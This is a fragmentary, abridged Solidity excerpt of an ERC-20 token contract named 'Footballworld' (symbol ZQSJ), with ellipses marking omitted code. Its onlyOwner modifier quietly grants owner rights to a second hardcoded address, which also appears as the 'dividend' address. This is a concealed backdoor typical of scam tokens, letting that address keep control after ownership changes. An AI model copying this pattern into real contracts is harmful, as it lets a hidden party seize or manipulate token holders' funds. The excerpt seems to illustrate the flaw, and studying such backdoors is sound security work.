...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x825C2d2D1458B4268e7A78Ff5742312D1a8A237c) , "owner");
        _;
    }
...
contract Footballworld  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Footballworld";
    string private _symbol = "ZQSJ";
    ...
    address public dividend = 0x825C2d2D1458B4268e7A78Ff5742312D1a8A237c;
